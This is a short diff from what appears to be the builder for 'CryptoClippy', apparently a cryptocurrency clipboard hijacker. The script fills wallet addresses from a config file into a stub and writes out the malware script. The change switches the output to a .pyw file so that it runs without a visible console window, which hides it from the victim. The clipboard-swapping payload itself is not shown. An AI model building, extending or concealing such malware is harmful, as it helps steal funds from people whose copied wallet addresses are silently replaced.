@@ -16,7 +16,7 @@ with open('config.json', 'r', encoding='utf-8') as f:
 for coin, address in config.items():
     stub = re.sub(rf'\|{coin}\|?', f'{address}', stub)
 
-with open('temp\\CryptoClippy.py', 'w', encoding='utf-8') as f:
+with open('temp\\CryptoClippy.pyw', 'w', encoding='utf-8') as f:
     f.write(stub)
 
 subprocess.run(['explorer', os.path.abspath('temp')])
